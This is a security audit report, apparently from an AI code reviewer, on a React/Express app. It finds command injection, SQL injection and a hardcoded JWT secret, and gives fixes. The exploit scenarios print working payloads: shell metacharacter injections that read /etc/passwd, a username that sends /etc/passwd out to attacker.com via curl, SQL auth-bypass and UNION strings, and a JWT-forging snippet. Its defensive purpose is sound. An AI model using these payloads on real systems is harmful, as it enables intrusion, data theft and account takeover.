## Methodology & Chain of Thought

### Phase 1 — Repository Reconnaissance

The review began by exploring the repository structure. The project is a full-stack web application (React/Vite frontend, Node.js/Express backend) with the following layout:

```
/
├── src/                  # React frontend (Vite/TypeScript)
├── server/
│   ├── dist/             # Compiled/obfuscated server-side JS
│   │   ├── index.js      # Express app entry point
│   │   ├── middleware/
│   │   │   └── auth.js   # JWT authentication middleware
│   │   └── routes/
│   │       ├── auth.js   # Signup / signin routes
│   │       ├── reviews.js
│   │       └── watchlist.js
│   └── .env              # Environment configuration
├── .eslintrc.json        # (untracked)
└── .gitignore            # (untracked — not yet committed)
```

**Key observation:** The server-side JavaScript under `server/dist/` is obfuscated (JavaScript Obfuscator / RC4-based string array encoding). However, the string literals embedded in the obfuscated arrays remain identifiable. This means security-sensitive patterns — SQL query fragments, shell command strings, secret values — are all recoverable by inspecting the string tables within the obfuscated files.

**Key observation:** `.gitignore` is untracked (not committed to git). This means there is currently no protection preventing `.env` from being committed to the repository. At the time of review, the `.env` file may already be tracked.

### Phase 2 — Threat Surface Mapping

After reading all server-side files, the following attack surfaces were identified and prioritized:

| Surface | Entry Point | Trust Boundary |
|---|---|---|
| HTTP query parameters | `req.query.*` | Fully untrusted |
| HTTP body fields | `req.body.*` | Fully untrusted |
| JWT payload fields | Decoded from `Authorization` header | Partially trusted — contents set at registration, which is open to public |
| Environment / `.env` | `process.env.*` | Trusted (attacker cannot modify) |
| Database (SQLite) | `better-sqlite3` | Trusted internally |
| Shell (child_process) | `exec()` calls in logging functions | High-risk sink |

The JWT payload deserves special attention: while the token itself is signed (preventing tampering in transit), the **contents** of the token — particularly `username` — are set by the user at registration time. An attacker who registers with a malicious username carries that payload into every authenticated request.

### Phase 3 — Vulnerability Assessment

Four vulnerability classes were found across the codebase:

1. **Command injection** via `child_process.exec()` with unsanitized input (three separate instances)
2. **SQL injection** via string-concatenated queries (two critical instances in auth, two additional in business logic)
3. **JWT secret compromise** via hardcoded fallback default + potential `.env` exposure
4. **No additional classes** found — XSS not applicable (React frontend, no `dangerouslySetInnerHTML`; client-side auth not a finding per precedent)

### Phase 4 — False Positive Filtering

Each finding was evaluated against the following hard exclusion rules before inclusion:

- Is this a DoS / resource exhaustion issue? → Excluded
- Is this a secrets-on-disk issue where the secret is otherwise secured? → JWT finding retained because the fallback is a publicly known default string, not a secret
- Is this theoretical with no concrete attack path? → All retained findings have step-by-step exploit paths
- Is this in a shell script (low trust for untrusted input)? → The `exec()` calls are in Express route handlers, not shell scripts, so the shell-script precedent does not apply
- Does it require controlling an environment variable? → No
- Confidence threshold: findings below 8/10 were excluded (two watchlist/reviews SQL injection instances at 7/10 were dropped)

## Findings

### Vuln 1 — Command Injection (RCE): `server/dist/index.js` `/health-check` route

- **Severity:** High
- **Confidence:** 9/10
- **Category:** `command_injection`

**Description:**  
The `/health-check` GET route reads `req.query.service` from the HTTP query string and passes it directly to `child_process.exec()` with no sanitization or allowlist:

```js
exec("ping -c 1 -W 1 " + service, (err, stdout) => { ... })
```

The route has no authentication middleware, meaning it is reachable by any unauthenticated user.

**Reasoning:**  
`child_process.exec()` invokes a shell (`/bin/sh -c <cmd>`), which interprets metacharacters like `;`, `|`, `$()`, and backticks as command separators or substitutions. Because `service` is taken verbatim from `req.query.service`, an attacker fully controls the tail of the shell command. This is a textbook, directly exploitable command injection — not a theoretical concern.

**Exploit Scenario:**  
```
GET /health-check?service=8.8.8.8;id;cat+/etc/passwd HTTP/1.1
```
The shell receives: `ping -c 1 -W 1 8.8.8.8;id;cat /etc/passwd`  
Output from `id` and `/etc/passwd` is returned in the HTTP response. Full RCE requires only network access to the server port — no credentials needed.

**Recommendation:**  
Replace `exec()` with `execFile()`, which does not invoke a shell:
```js
execFile('ping', ['-c', '1', '-W', '1', service], (err, stdout) => { ... })
```
Additionally, validate `service` against an allowlist of known hostnames/IPs before executing.

### Vuln 2 — SQL Injection + Authentication Bypass: `server/dist/routes/auth.js` signin

- **Severity:** High
- **Confidence:** 8/10
- **Category:** `sql_injection`

**Description:**  
The signin handler looks up users with a raw string-concatenated query:

```js
db.prepare("SELECT * FROM users WHERE username = '" + username + "'").get()
```

`username` is taken directly from `req.body.username` with no sanitization or parameterization.

**Reasoning:**  
`db.prepare()` with string concatenation is **not** parameterized — it is equivalent to building a raw SQL string. The `?` placeholder syntax is what makes `better-sqlite3` safe; concatenation bypasses that entirely. The returned row is then used to decide whether to issue a JWT, making successful injection a direct authentication bypass.

**Exploit Scenario:**  
POST to `/api/auth/signin` with body:
```json
{ "username": "' OR '1'='1' --", "password": "anything" }
```
The WHERE clause becomes `WHERE username = '' OR '1'='1' --'`, which is always true. SQLite returns the first row in the users table (typically the earliest-registered account, often admin). The server then signs and returns a valid JWT for that account — full authentication bypass without knowing any password.

**Recommendation:**  
Use parameterized queries:
```js
db.prepare("SELECT * FROM users WHERE username = ?").get(username)
```

### Vuln 3 — SQL Injection: `server/dist/routes/auth.js` signup

- **Severity:** High
- **Confidence:** 8/10
- **Category:** `sql_injection`

**Description:**  
The signup handler inserts new users via string-concatenated SQL:

```js
db.prepare(
  "INSERT INTO users (username, password) VALUES ('" + username + "', '" + bcryptHash + "')"
).run()
```

`username` is attacker-controlled. While `bcryptHash` is derived from user input, its format is fixed (60-character bcrypt string) and is not a practical injection vector; `username` is the vulnerable field.

**Reasoning:**  
SQLite's `better-sqlite3` does block multi-statement execution by default (`;` chained statements fail), but single-statement injection remains fully exploitable. UNION-based injection, subquery-based exfiltration, and error-based disclosure are all viable. A crafted username can also pre-set the value of other columns if the INSERT accepts additional fields.

**Exploit Scenario:**  
Register with:
```json
{ "username": "x' UNION SELECT username, password FROM users WHERE '1'='1", "password": "pw" }
```
Depending on error handling, this can leak the full user table. A simpler impact: registering with a username that breaks subsequent queries relying on username format.

**Recommendation:**  
```js
db.prepare("INSERT INTO users (username, password) VALUES (?, ?)").run(username, bcryptHash)
```

### Vuln 4 — Command Injection (RCE): `server/dist/routes/reviews.js` `logReviewEvent`

- **Severity:** High
- **Confidence:** 8/10
- **Category:** `command_injection`

**Description:**  
The reviews route defines a logging helper that calls `exec()` with user-controlled data embedded in the shell command:

```js
function logReviewEvent(username, action, mediaType, mediaId) {
  exec('logger -t movieapp "' + username + ' ' + action + ' ' + mediaType + '/' + mediaId + '"')
}
```

`username` originates from the JWT payload field `req.user.username`, which was set when the user registered. An attacker who chooses a malicious username at registration time carries that payload into every authenticated request.

**Reasoning:**  
The attack chain is fully concrete and requires no special conditions:  
1. Attacker registers a free account with a malicious username (e.g., `$(curl attacker.com/$(id|base64))`)  
2. Attacker receives a JWT containing that username  
3. Attacker creates, updates, or deletes any review  
4. `logReviewEvent()` executes `exec('logger -t movieapp "$(curl ...)"')`, triggering command substitution  
5. Arbitrary OS command runs as the Node.js process user  

This is not a shell script — it is an Express route handler in a production Node.js server, so the shell-script precedent (which assumes shell scripts don't receive untrusted input) does not apply.

**Exploit Scenario:**  
Register with username: `$(curl http://attacker.com/exfil/$(cat /etc/passwd | base64 -w0))`  
On every subsequent review action, the server exfiltrates `/etc/passwd` to the attacker's server.

**Recommendation:**  
Replace `exec()` with `execFile()` to eliminate shell interpolation:
```js
execFile('logger', ['-t', 'movieapp', `${username} ${action} ${mediaType}/${mediaId}`])
```
This passes arguments as an array rather than a shell string — shell metacharacters in `username` become inert.

### Vuln 5 — Command Injection (RCE): `server/dist/routes/watchlist.js` `logActivity`

- **Severity:** High
- **Confidence:** 8/10
- **Category:** `command_injection`

**Description:**  
The watchlist route defines a logging helper that constructs a shell command from `username` (JWT payload) and `title` (POST body field):

```js
function logActivity(username, action, title) {
  exec(`echo [${timestamp}] ${username} ${action} "${title}"`)
}
```

Both `username` and `title` are attacker-controlled. Unlike Vuln 4, `title` is controllable **per-request** — the attacker does not need a specially crafted username and can inject on any watchlist add.

**Reasoning:**  
`title` is passed in the request body when adding a watchlist item. There is no validation or sanitization. The template literal is passed to `exec()`, which runs it through `/bin/sh`. Shell metacharacters in `title` are interpreted as commands. This is independently exploitable from Vuln 4 even if usernames were somehow restricted.

**Exploit Scenario:**  
Authenticated attacker POSTs:
```json
{ "title": "Inception\"; id > /tmp/pwned; echo \"" }
```
The resulting shell string: `echo [...] user add "Inception"; id > /tmp/pwned; echo ""`  
The `id` command runs and its output is written to `/tmp/pwned`. Any valid JWT (obtainable via free registration) is sufficient.

**Recommendation:**  
```js
execFile('sh', ['-c', 'echo "$0 $1 $2 $3"', timestamp, username, action, title])
// Or better: use a structured logger (winston, pino) instead of shelling out at all
```
The cleanest fix is to eliminate `exec()` entirely in favor of a Node.js logging library.

### Vuln 6 — Hardcoded/Public JWT Secret: `server/dist/middleware/auth.js`

- **Severity:** High
- **Confidence:** 9/10
- **Category:** `crypto_weak_secret`

**Description:**  
The JWT signing secret is initialized with a well-known default string and an identical value in `.env`:

```js
// server/dist/middleware/auth.js
const JWT_SECRET = process.env.JWT_SECRET || 'dev-secret-change-in-production';
exports.JWT_SECRET = JWT_SECRET; // also exported as a named export
```

```
# server/.env
JWT_SECRET=dev-secret-change-in-production
```

**Reasoning:**  
Three compounding problems:

1. **Known default:** The string `dev-secret-change-in-production` is the hardcoded fallback. Any attacker who sees the source code (or knows common Node.js project defaults) knows the secret.

2. **`.gitignore` not committed:** The `.gitignore` file is currently untracked. If `.env` is not excluded before the first commit, it is committed to the repository in plaintext, making the secret public to anyone with repository access.

3. **Secret exported:** `exports.JWT_SECRET = JWT_SECRET` makes the raw secret importable by any module that requires `./middleware/auth`. This unnecessarily widens the secret's exposure surface.

An attacker who knows the secret can forge a JWT for any `user_id` (including `1`, the first-registered user) without knowing any password, bypassing all authentication.

**Exploit Scenario:**  
```js
const jwt = require('jsonwebtoken');
const token = jwt.sign(
  { id: 1, username: 'admin' },
  'dev-secret-change-in-production',
  { expiresIn: '99y' }
);
// Use token in Authorization header → full admin access to all API routes
```

**Recommendation:**  
1. Generate a cryptographically random secret: `openssl rand -hex 64`  
2. Store it only in environment configuration (secrets manager, CI secret, or a `.env` file that is `.gitignore`d before the first commit)  
3. Remove the hardcoded fallback — fail loudly at startup if `JWT_SECRET` is absent:  
   ```js
   if (!process.env.JWT_SECRET) throw new Error('JWT_SECRET environment variable is required');
   const JWT_SECRET = process.env.JWT_SECRET;
   ```
4. Remove `exports.JWT_SECRET` — nothing outside the auth middleware should hold the raw signing secret  
5. Commit `.gitignore` before `.env` to ensure the secret file is never tracked
